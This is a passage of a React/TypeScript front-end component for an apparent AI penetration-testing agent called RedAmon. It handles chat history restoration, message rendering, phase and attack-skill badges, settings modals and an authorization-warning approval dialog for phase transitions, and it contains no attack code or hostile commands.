          type: 'deep_think',
          id: msg.id,
          timestamp: new Date(msg.createdAt),
          trigger_reason: data.trigger_reason || '',
          analysis: data.analysis || '',
          iteration: data.iteration || 0,
          phase: data.phase || '',
        } as DeepThinkItem
      } else if (msg.type === 'plan_complete') {
        // Skip — we handle plan_complete as a post-pass below
        return null
      }
      // Skip unknown types
      return null
    }).filter((item): item is ChatItem => item !== null)

    // Post-pass: nest tool_complete items with wave_id into their PlanWaveItem containers
    // and apply plan_complete statuses (immutable updates — no direct mutation)
    // Build a lookup of tool_start timestamps by wave_id:tool_name for duration calc
    const waveToolStartTimes = new Map<string, Date>()
    for (const msg of full.messages) {
      if (msg.type === 'tool_start' && (msg.data as any)?.wave_id) {
        const d = msg.data as any
        waveToolStartTimes.set(`${d.wave_id}:${d.tool_name}`, new Date(msg.createdAt))
      }
    }

    const waveToolCompletes = full.messages.filter(
      (m: any) => m.type === 'tool_complete' && (m.data as any)?.wave_id
    )
    for (const msg of waveToolCompletes) {
      const data = msg.data as any
      const waveIdx = restored.findIndex(
        item => item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === data.wave_id
      )
      if (waveIdx !== -1) {
        const wave = restored[waveIdx] as PlanWaveItem
        const rawOutput = data.raw_output || ''
        const startTime = waveToolStartTimes.get(`${data.wave_id}:${data.tool_name}`)
        const completeTime = new Date(msg.createdAt)
        const duration = startTime ? completeTime.getTime() - startTime.getTime() : undefined
        restored[waveIdx] = {
          ...wave,
          tools: [...wave.tools, {
            type: 'tool_execution' as const,
            id: msg.id,
            timestamp: startTime || completeTime,
            tool_name: data.tool_name || '',
            tool_args: data.tool_args || {},
            status: (data.success ? 'success' : 'error') as 'success' | 'error',
            output_chunks: rawOutput ? [rawOutput] : [],
            final_output: data.output_summary,
            actionable_findings: data.actionable_findings || [],
            recommended_next_steps: data.recommended_next_steps || [],
            duration,
          }],
        }
      }
    }

    // Apply plan_complete statuses (immutable)
    const planCompletes = full.messages.filter((m: any) => m.type === 'plan_complete')
    for (const msg of planCompletes) {
      const data = msg.data as any
      const waveIdx = restored.findIndex(
        item => item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === data.wave_id
      )
      if (waveIdx !== -1) {
        const wave = restored[waveIdx] as PlanWaveItem
        let status: PlanWaveItem['status'] = 'success'
        if (data.failed === data.total_steps) {
          status = 'error'
        } else if (data.failed > 0) {
          status = 'partial'
        }
        restored[waveIdx] = { ...wave, status }
      }
    }

    // Apply plan_analysis data (immutable)
    const planAnalyses = full.messages.filter((m: any) => m.type === 'plan_analysis')
    for (const msg of planAnalyses) {
      const data = msg.data as any
      const waveIdx = restored.findIndex(
        (item: ChatItem) => 'type' in item && item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === data.wave_id
      )
      if (waveIdx !== -1) {
        const wave = restored[waveIdx] as PlanWaveItem
        restored[waveIdx] = {
          ...wave,
          interpretation: data.interpretation || '',
          actionable_findings: data.actionable_findings || [],
          recommended_next_steps: data.recommended_next_steps || [],
        }
      }
    }

    // Wave tool_complete items were already skipped in the map pass, so restored is final
    const finalRestored = restored

    // Apply state
    setChatItems(finalRestored)
    setConversationId(conv.id)
    setCurrentPhase((conv.currentPhase || 'informational') as Phase)
    setAttackPathType(lastAttackPathType)
    setIterationCount(conv.iterationCount || 0)
    setIsLoading(conv.agentRunning)
    setIsStopped(false)
    setTodoList(lastTodoList)
    shouldAutoScroll.current = true
    setShowHistory(false)

    // Restore pending approval/question state if not yet acted upon.
    // The agent is NOT "running" while waiting — it finishes its task and waits
    // for the user to respond. So we check for agent work, not agentRunning.
    if (lastApprovalRequest && !hasWorkAfterApproval) {
      setAwaitingApproval(true)
      setApprovalRequest(lastApprovalRequest)
      awaitingApprovalRef.current = true
    } else {
      setAwaitingApproval(false)
      setApprovalRequest(null)
    }
    if (lastQuestionRequest && !hasWorkAfterQuestion) {
      setAwaitingQuestion(true)
      setQuestionRequest(lastQuestionRequest)
      awaitingQuestionRef.current = true
    } else {
      setAwaitingQuestion(false)
      setQuestionRequest(null)
    }

    // Switch WebSocket session — flag to prevent the sessionId useEffect from clearing state
    isRestoringConversation.current = true
    onSwitchSession?.(conv.sessionId)
  }, [loadConversation, onSwitchSession])

  const handleHistoryNewChat = () => {
    setShowHistory(false)
    handleNewChat()
  }

  const handleDeleteConversation = useCallback(async (id: string) => {
    await deleteConversation(id)
    onRefetchGraph?.()
    // If we just deleted the active conversation, reset to a clean state
    if (id === conversationId) {
      handleNewChat()
    }
  }, [deleteConversation, onRefetchGraph, conversationId, handleNewChat])

  const PhaseIcon = PHASE_CONFIG[currentPhase].icon

  // Connection status indicator with color
  const getConnectionStatusColor = () => {
    return status === ConnectionStatus.CONNECTED ? '#10b981' : '#ef4444' // green : red
  }

  const getConnectionStatusIcon = () => {
    const color = getConnectionStatusColor()
    if (status === ConnectionStatus.CONNECTED) {
      return <Wifi size={12} className={styles.connectionIcon} style={{ color }} />
    } else if (status === ConnectionStatus.RECONNECTING) {
      return <Loader2 size={12} className={`${styles.connectionIcon} ${styles.spinner}`} style={{ color }} />
    } else {
      return <WifiOff size={12} className={styles.connectionIcon} style={{ color }} />
    }
  }

  const getConnectionStatusText = () => {
    switch (status) {
      case ConnectionStatus.CONNECTING:
        return 'Connecting...'
      case ConnectionStatus.CONNECTED:
        return 'Connected'
      case ConnectionStatus.RECONNECTING:
        return `Reconnecting... (${reconnectAttempt}/5)`
      case ConnectionStatus.FAILED:
        return 'Connection failed'
      case ConnectionStatus.DISCONNECTED:
        return 'Disconnected'
    }
  }

  // Group timeline items by their sequence (between messages)
  const groupedChatItems: Array<{ type: 'message' | 'timeline' | 'file_download', content: Message | Array<ThinkingItem | ToolExecutionItem | PlanWaveItem | DeepThinkItem> | FileDownloadItem }> = []

  let currentTimelineGroup: Array<ThinkingItem | ToolExecutionItem | PlanWaveItem | DeepThinkItem> = []

  chatItems.forEach((item) => {
    if ('role' in item) {
      // It's a message - push any accumulated timeline items first
      if (currentTimelineGroup.length > 0) {
        groupedChatItems.push({ type: 'timeline', content: currentTimelineGroup })
        currentTimelineGroup = []
      }
      // Then push the message
      groupedChatItems.push({ type: 'message', content: item })
    } else if ('type' in item && item.type === 'file_download') {
      // File download cards are standalone (not grouped into timeline)
      if (currentTimelineGroup.length > 0) {
        groupedChatItems.push({ type: 'timeline', content: currentTimelineGroup })
        currentTimelineGroup = []
      }
      groupedChatItems.push({ type: 'file_download', content: item })
    } else if ('type' in item && (item.type === 'thinking' || item.type === 'tool_execution' || item.type === 'plan_wave' || item.type === 'deep_think')) {
      // It's a timeline item - add to current group
      currentTimelineGroup.push(item)
    }
  })

  // Push any remaining timeline items
  if (currentTimelineGroup.length > 0) {
    groupedChatItems.push({ type: 'timeline', content: currentTimelineGroup })
  }

  const handleCopyMessage = useCallback((messageId: string, content: string) => {
    navigator.clipboard.writeText(content).then(() => {
      setCopiedMessageId(messageId)
      setTimeout(() => setCopiedMessageId(null), 2000)
    })
  }, [])

  const handleCopyField = useCallback((key: string, text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedFieldKey(key)
      setTimeout(() => setCopiedFieldKey(null), 2000)
    })
  }, [])

  const renderMessage = (item: Message) => {
    return (
      <div
        key={item.id}
        className={`${styles.message} ${
          item.role === 'user' ? styles.messageUser : styles.messageAssistant
        } ${item.isGuidance ? styles.messageGuidance : ''}`}
      >
        <div className={styles.messageIcon}>
          {item.role === 'user' ? <User size={14} /> : <Bot size={14} />}
        </div>
        <div className={styles.messageContent}>
          {item.isGuidance && (
            <span className={styles.guidanceBadge}>Guidance</span>
          )}
          {item.responseTier === 'full_report' && (
            <div className={styles.reportHeader}>
              <span className={styles.reportBadge}>Report</span>
            </div>
          )}
          {item.responseTier === 'summary' && (
            <div className={styles.reportHeader}>
              <span className={styles.summaryBadge}>Summary</span>
            </div>
          )}
          <div
            className={styles.messageText}
            {...(item.responseTier === 'full_report' || item.responseTier === 'summary' ? { 'data-report-content': true } : {})}
          >
            <ReactMarkdown
              remarkPlugins={[remarkGfm]}
              components={{
                code({ className, children, ...props }: any) {
                  const match = /language-(\w+)/.exec(className || '')
                  const language = match ? match[1] : ''
                  const isInline = !className
                  const codeText = String(children).replace(/\n$/, '')

                  if (!isInline) {
                    const codeKey = `code-${item.id}-${codeText.slice(0, 20)}`
                    return (
                      <div className={styles.codeBlockWrapper}>
                        <button
                          className={`${styles.codeBlockCopyButton} ${copiedFieldKey === codeKey ? styles.codeBlockCopyButtonCopied : ''}`}
                          onClick={() => handleCopyField(codeKey, codeText)}
                          title="Copy code"
                        >
                          {copiedFieldKey === codeKey ? <Check size={11} /> : <Copy size={11} />}
                        </button>
                        {language ? (
                          <SyntaxHighlighter
                            style={vscDarkPlus as any}
                            language={language}
                            PreTag="div"
                          >
                            {codeText}
                          </SyntaxHighlighter>
                        ) : (
                          <pre><code className={className} {...props}>{children}</code></pre>
                        )}
                      </div>
                    )
                  }

                  return (
                    <code className={className} {...props}>
                      {children}
                    </code>
                  )
                },
                td({ children, ...props }: any) {
                  const text = extractTextFromChildren(children)
                  if (!text || text.length < 3) {
                    return <td {...props}>{children}</td>
                  }
                  const cellKey = `td-${item.id}-${text.slice(0, 30)}`
                  return (
                    <td {...props}>
                      <span className={styles.tableCellContent}>
                        {children}
                        <button
                          className={`${styles.tableCellCopyButton} ${copiedFieldKey === cellKey ? styles.tableCellCopyButtonCopied : ''}`}
                          onClick={() => handleCopyField(cellKey, text)}
                          title="Copy value"
                        >
                          {copiedFieldKey === cellKey ? <Check size={10} /> : <Copy size={10} />}
                        </button>
                      </span>
                    </td>
                  )
                },
              }}
            >
              {item.content}
            </ReactMarkdown>
          </div>

          {item.role === 'assistant' && !item.isGuidance && (
            <button
              className={`${styles.copyButton} ${copiedMessageId === item.id ? styles.copyButtonCopied : ''}`}
              onClick={() => handleCopyMessage(item.id, item.content)}
              title="Copy to clipboard"
            >
              {copiedMessageId === item.id ? <><Check size={12} /> Copied</> : <><Copy size={12} /> Copy</>}
            </button>
          )}

          {item.error && (
            <div className={styles.errorBadge}>
              <AlertCircle size={12} />
              <span>{item.error}</span>
            </div>
          )}
        </div>
      </div>
    )
  }

  return (
    <div
      className={`${styles.drawer} ${isOpen ? styles.drawerOpen : ''}`}
      aria-hidden={!isOpen}
    >
      {/* Header */}
      <div className={styles.header}>
        <div className={styles.headerLeft}>
          <div className={styles.headerIcon}>
            <Bot size={16} />
          </div>
          <div className={styles.headerText}>
            <h2 className={styles.title}>AI Agent</h2>
            <div className={styles.connectionStatus}>
              {getConnectionStatusIcon()}
              <span className={styles.subtitle} style={{ color: getConnectionStatusColor() }}>
                {getConnectionStatusText()}
              </span>
              <span className={styles.sessionCode} title={sessionId}>
                Session: {sessionId.slice(-8)}
              </span>
            </div>
          </div>
        </div>
        <div className={styles.headerActions}>
          {hasOtherChains && onToggleOtherChains && (
            <button
              className={`${styles.iconButton} ${isOtherChainsHidden ? styles.iconButtonActive : ''}`}
              onClick={onToggleOtherChains}
              title={isOtherChainsHidden ? 'Show all sessions in graph' : 'Show only this session in graph'}
              aria-label={isOtherChainsHidden ? 'Show all sessions in graph' : 'Show only this session in graph'}
            >
              {isOtherChainsHidden ? <Eye size={14} /> : <EyeOff size={14} />}
            </button>
          )}
          <button
            className={styles.iconButton}
            onClick={() => setShowHistory(!showHistory)}
            title="Session history"
            aria-label="Session history"
          >
            <History size={14} />
          </button>
          <button
            className={styles.iconButton}
            onClick={handleNewChat}
            title="New session"
            aria-label="Start new session"
          >
            <Plus size={14} />
          </button>
          <button
            className={styles.iconButton}
            onClick={handleDownloadMarkdown}
            title="Download chat as Markdown"
            aria-label="Download chat as Markdown"
            disabled={chatItems.length === 0}
          >
            <Download size={14} />
          </button>
          <button
            className={styles.closeButton}
            onClick={onClose}
            aria-label="Close assistant"
          >
            &times;
          </button>
        </div>
      </div>

      {/* Session History Panel */}
      {showHistory && (
        <ConversationHistory
          conversations={conversations}
          currentSessionId={sessionId}
          onBack={() => setShowHistory(false)}
          onSelect={handleSelectConversation}
          onDelete={handleDeleteConversation}
          onNewChat={handleHistoryNewChat}
        />
      )}

      {/* Phase Indicator */}
      <div className={styles.phaseIndicator}>
        <div
          className={styles.phaseBadge}
          style={{
            backgroundColor: PHASE_CONFIG[currentPhase].bgColor,
            borderColor: PHASE_CONFIG[currentPhase].color,
          }}
        >
          <PhaseIcon size={14} style={{ color: PHASE_CONFIG[currentPhase].color }} />
          <span style={{ color: PHASE_CONFIG[currentPhase].color }}>
            {PHASE_CONFIG[currentPhase].label}
          </span>
        </div>

        {/* Phase Tools Icon */}
        {toolPhaseMap && (() => {
          const phaseTools = Object.entries(toolPhaseMap)
            .filter(([, phases]) => phases.includes(currentPhase))
            .map(([name]) => name)
          return phaseTools.length > 0 ? (
            <Tooltip
              position="bottom"
              content={
                <div className={styles.phaseToolsTooltip}>
                  <div className={styles.phaseToolsHeader}>Phase Tools</div>
                  {phaseTools.map(t => (
                    <div key={t} className={styles.phaseToolsItem}>{t}</div>
                  ))}
                </div>
              }
            >
              <Wrench
                size={13}
                className={styles.phaseToolsIcon}
              />
            </Tooltip>
          ) : null
        })()}

        {/* Attack Skill Badge - Show in all phases once classified */}
        {attackPathType && (currentPhase === 'informational' || currentPhase === 'exploitation' || currentPhase === 'post_exploitation') && (
          <Tooltip
            position="bottom"
            content={
              <div className={styles.skillTooltip}>
                <div className={styles.skillTooltipHeader}>
                  <Swords size={11} />
                  Attack Skills
                </div>
                {skillData && (
                  <>
                    <div className={styles.skillTooltipGroup}>
                      <div className={styles.skillTooltipGroupLabel}>Built-in</div>
                      {skillData.builtIn.map(s => {
                        const enabled = skillData.config.builtIn[s.id] !== false
                        const isActive = attackPathType === s.id
                        return (
                          <div key={s.id} className={`${styles.skillTooltipItem} ${!enabled ? styles.skillTooltipItemDisabled : ''} ${isActive ? styles.skillTooltipItemActive : ''}`}>
                            <span className={styles.skillTooltipName}>{s.name}</span>
                            {isActive && <Check size={11} className={styles.skillTooltipCheck} />}
                            {!enabled && <span className={styles.skillTooltipOff}>OFF</span>}
                          </div>
                        )
                      })}
                    </div>
                    {skillData.user.length > 0 && (
                      <div className={styles.skillTooltipGroup}>
                        <div className={styles.skillTooltipGroupLabel}>User Skills</div>
                        {skillData.user.map(s => {
                          const enabled = skillData.config.user[s.id] !== false
                          const isActive = attackPathType === `user_skill:${s.id}`
                          return (
                            <div key={s.id} className={`${styles.skillTooltipItem} ${!enabled ? styles.skillTooltipItemDisabled : ''} ${isActive ? styles.skillTooltipItemActive : ''}`}>
                              <span className={styles.skillTooltipName}>{s.name}</span>
                              {isActive && <Check size={11} className={styles.skillTooltipCheck} />}
                              {!enabled && <span className={styles.skillTooltipOff}>OFF</span>}
                            </div>
                          )
                        })}
                      </div>
                    )}
                  </>
                )}
              </div>
            }
          >
            <div
              className={styles.phaseBadge}
              style={{
                backgroundColor: getAttackPathConfig(attackPathType).bgColor,
                borderColor: getAttackPathConfig(attackPathType).color,
              }}
            >
              <span style={{ color: getAttackPathConfig(attackPathType).color }}>
                {getAttackPathConfig(attackPathType).shortLabel}
              </span>
            </div>
          </Tooltip>
        )}

        {iterationCount > 0 && (
          <span className={styles.iterationCount}>Step {iterationCount}</span>
        )}

        {onToggleStealth ? (
          <button
            className={`${styles.stealthToggle} ${stealthMode ? styles.stealthToggleActive : ''}`}
            onClick={() => onToggleStealth(!stealthMode)}
            title={stealthMode
              ? 'Stealth Mode ON — click to disable'
              : 'Stealth Mode OFF — click to enable passive-only techniques'
            }
          >
            <StealthIcon size={11} />
          </button>
        ) : stealthMode ? (
          <span className={styles.stealthBadge} title="Stealth Mode — passive/low-noise techniques only">
            <StealthIcon size={11} />
          </span>
        ) : null}

        {onToggleDeepThink ? (
          <button
            className={`${styles.deepThinkToggle} ${deepThinkEnabled ? styles.deepThinkToggleActive : ''}`}
            onClick={() => onToggleDeepThink(!deepThinkEnabled)}
            title={deepThinkEnabled
              ? 'Deep Think ON — the agent performs strategic reasoning at key decision points (start, phase transitions, failure loops) before acting. Click to disable.'
              : 'Deep Think OFF — click to enable strategic reasoning at key decision points. Adds ~1 extra LLM call at start, phase transitions, and failure loops to plan multi-step strategies.'
            }
          >
            <Lightbulb size={11} />
          </button>
        ) : deepThinkEnabled ? (
          <span className={styles.deepThinkBadge} title="Deep Think — strategic reasoning at key decision points">
            <Lightbulb size={11} />
          </span>
        ) : null}

        {/* Settings dropdown */}
        <div className={styles.settingsWrapper} ref={settingsDropdownRef}>
          <button
            className={styles.settingsButton}
            onClick={() => setShowSettingsDropdown(prev => !prev)}
            title="Agent settings"
          >
            <Settings size={12} />
          </button>
          {showSettingsDropdown && (
            <div className={styles.settingsDropdown}>
              <button
                className={styles.settingsDropdownItem}
                onClick={() => { setSettingsModal('agent'); setShowSettingsDropdown(false) }}
              >
                Agent Behaviour
              </button>
              <button
                className={styles.settingsDropdownItem}
                onClick={() => { setSettingsModal('toolmatrix'); setShowSettingsDropdown(false) }}
              >
                Tool Matrix
              </button>
              <button
                className={styles.settingsDropdownItem}
                onClick={() => { setSettingsModal('attack'); setShowSettingsDropdown(false) }}
              >
                Attack Skills
              </button>
            </div>
          )}
        </div>

        {modelName && (
          <span className={styles.modelBadge}>{formatModelDisplay(modelName)}</span>
        )}
      </div>

      {/* Settings Modal */}
      {settingsModal && (
        <div className={styles.settingsModalOverlay} onClick={() => setSettingsModal(null)}>
          <div className={styles.settingsModal} onClick={e => e.stopPropagation()}>
            <div className={styles.settingsModalHeader}>
              <h2 className={styles.settingsModalTitle}>
                {settingsModal === 'agent' ? 'Agent Behaviour' : settingsModal === 'toolmatrix' ? 'Tool Matrix' : 'Attack Skills'}
              </h2>
              <button className={styles.settingsModalClose} onClick={() => setSettingsModal(null)}>
                <X size={16} />
              </button>
            </div>
            <div className={styles.settingsModalBody}>
              {projectFormData ? (
                settingsModal === 'agent' ? (
                  <AgentBehaviourSection data={projectFormData} updateField={updateProjectField} />
                ) : settingsModal === 'toolmatrix' ? (
                  <ToolMatrixSection data={projectFormData} updateField={updateProjectField} />
                ) : (
                  <AttackSkillsSection data={projectFormData} updateField={updateProjectField} />
                )
              ) : (
                <div style={{ display: 'flex', justifyContent: 'center', padding: '2rem' }}>
                  <Loader2 size={24} className={styles.spinner} />
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Todo List Widget */}
      {todoList.length > 0 && (
        <div className={styles.todoWidgetContainer}>
          <TodoListWidget items={todoList} />
        </div>
      )}

      {/* Unified Chat (Messages + Timeline Items) */}
      <div className={styles.messages} ref={messagesContainerRef} onScroll={checkIfAtBottom}>
        {chatItems.length === 0 && (
          <div className={styles.emptyState}>
            <div className={styles.emptyIcon}>
              <img src="/logo.png" alt="RedAmon" width={72} height={72} style={{ objectFit: 'contain' }} />
            </div>
            <h3 className={styles.emptyTitle}>How can I help you?</h3>
            <p className={styles.emptyDescription}>
              Ask me about recon data, vulnerabilities, exploitation, or post-exploitation activities.
            </p>
            <div className={styles.templateGroups}>
              {/* Informational */}
              <div className={styles.templateGroup}>
                <button
                  className={`${styles.templateGroupHeader} ${openTemplateGroup === 'informational' ? styles.templateGroupHeaderOpen : ''}`}
                  onClick={() => setOpenTemplateGroup((prev: string | null) => prev === 'informational' ? null : 'informational')}
                  style={{ '--tg-color': 'var(--text-tertiary)' } as React.CSSProperties}
                >
                  <Shield size={14} />
                  <span>Informational</span>
                  <ChevronDown size={14} className={styles.templateGroupChevron} />
                </button>
                {openTemplateGroup === 'informational' && (
                  <div className={styles.templateGroupItems}>
                    {INFORMATIONAL_GROUPS.map(group => (
                      <React.Fragment key={group.id}>
                        <button
                          className={`${styles.templateSubGroupHeader} ${openInfoSubGroup === group.id ? styles.templateSubGroupHeaderOpen : ''}`}
                          onClick={() => setOpenInfoSubGroup(prev => prev === group.id ? null : group.id)}
                        >
                          <span>{group.title}</span>
                          <ChevronDown size={12} className={styles.templateSubGroupChevron} />
                        </button>
                        {openInfoSubGroup === group.id && (
                          <div className={styles.templateSubGroupItems}>
                            {group.items.map((section, i) => (
                              <React.Fragment key={i}>
                                {section.osLabel && <span className={styles.templateOsLabel}>{section.osLabel}</span>}
                                {section.suggestions.map((s, j) => (
                                  <button key={j} className={styles.suggestion} onClick={() => setInputValue(s.prompt)} disabled={!isConnected}>
                                    {s.label}
                                  </button>
                                ))}
                              </React.Fragment>
                            ))}
                          </div>
                        )}
                      </React.Fragment>
                    ))}
                  </div>
                )}
              </div>

              {/* Exploitation */}
              <div className={styles.templateGroup}>
                <button
                  className={`${styles.templateGroupHeader} ${openTemplateGroup === 'exploitation' ? styles.templateGroupHeaderOpen : ''}`}
                  onClick={() => setOpenTemplateGroup((prev: string | null) => prev === 'exploitation' ? null : 'exploitation')}
                  style={{ '--tg-color': 'var(--status-warning)' } as React.CSSProperties}
                >
                  <Target size={14} />
                  <span>Exploitation</span>
                  <ChevronDown size={14} className={styles.templateGroupChevron} />
                </button>
                {openTemplateGroup === 'exploitation' && (
                  <div className={styles.templateGroupItems}>
                    {EXPLOITATION_GROUPS.map(group => (
                      <React.Fragment key={group.id}>
                        <button
                          className={`${styles.templateSubGroupHeader} ${openExploitSubGroup === group.id ? styles.templateSubGroupHeaderOpen : ''}`}
                          onClick={() => setOpenExploitSubGroup(prev => prev === group.id ? null : group.id)}
                        >
                          <span>{group.title}</span>
                          <ChevronDown size={12} className={styles.templateSubGroupChevron} />
                        </button>
                        {openExploitSubGroup === group.id && (
                          <div className={styles.templateSubGroupItems}>
                            {group.items.map((section, i) => (
                              <React.Fragment key={i}>
                                {section.osLabel && <span className={styles.templateOsLabel}>{section.osLabel}</span>}
                                {section.suggestions.map((s, j) => (
                                  <button key={j} className={styles.suggestion} onClick={() => setInputValue(s.prompt)} disabled={!isConnected}>
                                    {s.label}
                                  </button>
                                ))}
                              </React.Fragment>
                            ))}
                          </div>
                        )}
                      </React.Fragment>
                    ))}
                  </div>
                )}
              </div>

              {/* Social Engineering */}
              <div className={styles.templateGroup}>
                <button
                  className={`${styles.templateGroupHeader} ${openTemplateGroup === 'social_engineering' ? styles.templateGroupHeaderOpen : ''}`}
                  onClick={() => setOpenTemplateGroup((prev: string | null) => prev === 'social_engineering' ? null : 'social_engineering')}
                  style={{ '--tg-color': 'var(--accent-tertiary, #ec4899)' } as React.CSSProperties}
                >
                  <Mail size={14} />
                  <span>Social Engineering</span>
                  <ChevronDown size={14} className={styles.templateGroupChevron} />
                </button>
                {openTemplateGroup === 'social_engineering' && (
                  <div className={styles.templateGroupItems}>
                    {SOCIAL_ENGINEERING_GROUPS.map(group => (
                      <React.Fragment key={group.id}>
                        <button
                          className={`${styles.templateSubGroupHeader} ${openSocialSubGroup === group.id ? styles.templateSubGroupHeaderOpen : ''}`}
                          onClick={() => setOpenSocialSubGroup(prev => prev === group.id ? null : group.id)}
                        >
                          <span>{group.title}</span>
                          <ChevronDown size={12} className={styles.templateSubGroupChevron} />
                        </button>
                        {openSocialSubGroup === group.id && (
                          <div className={styles.templateSubGroupItems}>
                            {group.items.map((section, i) => (
                              <React.Fragment key={i}>
                                {section.osLabel && <span className={styles.templateOsLabel}>{section.osLabel}</span>}
                                {section.suggestions.map((s, j) => (
                                  <button key={j} className={styles.suggestion} onClick={() => setInputValue(s.prompt)} disabled={!isConnected}>
                                    {s.label}
                                  </button>
                                ))}
                              </React.Fragment>
                            ))}
                          </div>
                        )}
                      </React.Fragment>
                    ))}
                  </div>
                )}
              </div>

              {/* Post-Exploitation */}
              <div className={styles.templateGroup}>
                <button
                  className={`${styles.templateGroupHeader} ${openTemplateGroup === 'post_exploitation' ? styles.templateGroupHeaderOpen : ''}`}
                  onClick={() => setOpenTemplateGroup((prev: string | null) => prev === 'post_exploitation' ? null : 'post_exploitation')}
                  style={{ '--tg-color': 'var(--status-error)' } as React.CSSProperties}
                >
                  <Zap size={14} />
                  <span>Post-Exploitation</span>
                  <ChevronDown size={14} className={styles.templateGroupChevron} />
                </button>
                {openTemplateGroup === 'post_exploitation' && (
                  <div className={styles.templateGroupItems}>
                    {POST_EXPLOITATION_GROUPS.map(group => (
                      <React.Fragment key={group.id}>
                        <button
                          className={`${styles.templateSubGroupHeader} ${openPostSubGroup === group.id ? styles.templateSubGroupHeaderOpen : ''}`}
                          onClick={() => setOpenPostSubGroup(prev => prev === group.id ? null : group.id)}
                        >
                          <span>{group.title}</span>
                          <ChevronDown size={12} className={styles.templateSubGroupChevron} />
                        </button>
                        {openPostSubGroup === group.id && (
                          <div className={styles.templateSubGroupItems}>
                            {group.items.map((section, i) => (
                              <React.Fragment key={i}>
                                {section.osLabel && <span className={styles.templateOsLabel}>{section.osLabel}</span>}
                                {section.suggestions.map((s, j) => (
                                  <button key={j} className={styles.suggestion} onClick={() => setInputValue(s.prompt)} disabled={!isConnected}>
                                    {s.label}
                                  </button>
                                ))}
                              </React.Fragment>
                            ))}
                          </div>
                        )}
                      </React.Fragment>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Render messages and timeline items in chronological order */}
        {groupedChatItems.map((groupItem, index) => {
          if (groupItem.type === 'message') {
            return renderMessage(groupItem.content as Message)
          } else if (groupItem.type === 'file_download') {
            const file = groupItem.content as FileDownloadItem
            return (
              <FileDownloadCard
                key={file.id}
                filepath={file.filepath}
                filename={file.filename}
                description={file.description}
                source={file.source}
              />
            )
          } else {
            // Render timeline group
            const items = groupItem.content as Array<ThinkingItem | ToolExecutionItem | PlanWaveItem | DeepThinkItem>
            return (
              <AgentTimeline
                key={`timeline-${index}`}
                items={items}
                isStreaming={isLoading && index === groupedChatItems.length - 1}
                missingApiKeys={missingApiKeys}
                onAddApiKey={openApiKeyModal}
              />
            )
          }
        })}

        {isLoading && (
          <div className={`${styles.message} ${styles.messageAssistant}`}>
            <div className={styles.messageIcon}>
              <Bot size={14} />
            </div>
            <div className={styles.messageContent}>
              <div className={styles.loadingIndicator}>
                <Loader2 size={14} className={styles.spinner} />
                <span>Processing...</span>
              </div>
            </div>
          </div>
        )}

        <div ref={messagesEndRef} />
      </div>

      {/* Approval Dialog */}
      {awaitingApproval && approvalRequest && (
        <div className={styles.approvalDialog}>
          <div className={styles.approvalHeader}>
            <AlertCircle size={16} />
            <span>Phase Transition Request</span>
          </div>
          <div className={styles.approvalContent}>
            <p className={styles.approvalTransition}>
              <span className={styles.approvalFrom}>{approvalRequest.from_phase}</span>
              <span className={styles.approvalArrow}>→</span>
              <span className={styles.approvalTo}>{approvalRequest.to_phase}</span>
            </p>

            <div className={styles.approvalDisclaimer}>
              <ShieldAlert size={16} className={styles.approvalDisclaimerIcon} />
              <p className={styles.approvalDisclaimerText}>
                This transition will enable <strong>active operations</strong> against the target.
                By approving, you confirm that you <strong>own the target</strong> or have{' '}
                <strong>explicit written permission</strong> from the owner.
                Unauthorized activity is illegal and may result in criminal penalties.
              </p>
            </div>

            <p className={styles.approvalReason}>{approvalRequest.reason}</p>

            {approvalRequest.planned_actions.length > 0 && (
              <div className={styles.approvalSection}>
                <strong>Planned Actions:</strong>
                <ul>
                  {approvalRequest.planned_actions.map((action, i) => (
                    <li key={i}>{action}</li>
                  ))}
                </ul>
              </div>
            )}

            {approvalRequest.risks.length > 0 && (
              <div className={styles.approvalSection}>
                <strong>Risks:</strong>
                <ul>
                  {approvalRequest.risks.map((risk, i) => (
                    <li key={i}>{risk}</li>
                  ))}
                </ul>
              </div>
            )}

            <textarea
              className={styles.modificationInput}
              placeholder="Optional: provide modification feedback..."
              value={modificationText}
              onChange={(e) => setModificationText(e.target.value)}
            />
          </div>
          <div className={styles.approvalActions}>
            <button
              className={`${styles.approvalButton} ${styles.approvalButtonApprove}`}
              onClick={() => handleApproval('approve')}
              disabled={isLoading}
            >
              Approve
            </button>
            <button
              className={`${styles.approvalButton} ${styles.approvalButtonModify}`}
              onClick={() => handleApproval('modify')}
              disabled={isLoading || !modificationText.trim()}
            >
              Modify
            </button>
            <button
              className={`${styles.approvalButton} ${styles.approvalButtonAbort}`}
              onClick={() => handleApproval('abort')}
              disabled={isLoading}
            >
              Abort
            </button>
          </div>
        </div>
      )}

      {/* Q&A Dialog */}
      {awaitingQuestion && questionRequest && (
        <div className={styles.questionDialog}>
          <div className={styles.questionHeader}>
            <HelpCircle size={16} />
            <span>Agent Question</span>
          </div>
          <div className={styles.questionContent}>
            <div className={styles.questionText}>
              <ReactMarkdown
                remarkPlugins={[remarkGfm]}
                components={{
                  code({ className, children, ...props }: any) {
                    const match = /language-(\w+)/.exec(className || '')
                    const language = match ? match[1] : ''
                    const isInline = !className

                    return !isInline && language ? (
                      <SyntaxHighlighter
                        style={vscDarkPlus as any}
                        language={language}
                        PreTag="div"
                      >
                        {String(children).replace(/\n$/, '')}
                      </SyntaxHighlighter>
                    ) : (
                      <code className={className} {...props}>
                        {children}
                      </code>
                    )
                  }
                }}
              >
                {questionRequest.question}
              </ReactMarkdown>
            </div>
            {questionRequest.context && (
              <div className={styles.questionContext}>
                <ReactMarkdown remarkPlugins={[remarkGfm]}>
                  {questionRequest.context}
                </ReactMarkdown>
              </div>
            )}

            {questionRequest.format === 'text' && (
              <textarea
                className={styles.answerInput}
                placeholder={questionRequest.default_value || 'Type your answer...'}
                value={answerText}
                onChange={(e) => setAnswerText(e.target.value)}
              />
            )}

            {questionRequest.format === 'single_choice' && questionRequest.options.length > 0 && (
              <div className={styles.optionsList}>
                {questionRequest.options.map((option, i) => (
                  <label key={i} className={styles.optionRadio}>
                    <input
                      type="radio"
                      name="question-option"
                      value={option}
                      checked={selectedOptions[0] === option}
                      onChange={() => setSelectedOptions([option])}
                    />
                    <span>{option}</span>
                  </label>
                ))}
              </div>
            )}

            {questionRequest.format === 'multi_choice' && questionRequest.options.length > 0 && (
